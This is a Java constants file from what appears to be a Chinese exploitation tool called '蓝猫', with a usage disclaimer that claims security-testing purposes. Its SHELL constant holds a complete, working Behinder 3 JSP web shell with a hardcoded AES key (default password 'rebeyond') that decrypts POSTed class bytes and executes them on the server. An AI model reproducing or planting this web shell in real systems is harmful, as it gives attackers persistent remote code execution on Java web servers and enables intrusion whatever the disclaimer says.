package fun.fireline.core;

/**
 * @author yhy
 * @date 2021/3/25 11:20
 * @github https://github.com/yhy0
 */

public class Constants {

    public static String NAME = "蓝猫";

    public static String VERSION = "v2.0 ";

    public static String AUTHOR = "fullstack";

    public static String SECURITYSTATEMENT = "\t\t\t\t\t\t\t\t\t----------------------------------------------------------------\r\n\t\t\t" +
            "\t\t\t\t\t\t\t\t本工具仅提供给安全测试人员进行安全自查使用\r\n\t\t\t" +
            "\t\t\t\t\t\t\t\t用户滥用造成的一切后果与作者无关\r\n\t\t\t" +
            "\t\t\t\t\t\t\t\t使用者请务必遵守当地法律\r\n\t\t\t" +
            "\t\t\t\t\t\t\t\t本程序不得用于商业用途，仅限学习交流\r\n\t\t\t" +
            "\t\t\t\t\t\t----------------------------------------------------------------\r\n\r\n" +
            "\t\t\t\t\t\t\t\t\t\t目前所有的payload均为互联网公开，我只是个搬运工，感谢各位师傅\r\n\t\t\t\r\n\r\n";

    public static String UPDATEINFO =
            "Bug反馈:  扫码加我微信\r\n\r\n" +
            "原项目为神机V1.9 地址https://github.com/yhy0/ExpDemo-JavaFX \r\n" ;


    public static String[] ENCODING = {
            "UTF-8",
            "GBK",
            "GBK2312",
            "ISO-8859-1"
    };

//    // fofa 搜索数
//    public static int[] SIZE = {10, 50, 100, 300, 600, 1000, 10000};
//    // fofa配置保存位置
//    public static String FOFAPATH = "fofa.conf";

    // 默认为冰蝎3 的shell.jspx
    public static String SHELL = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>";

}
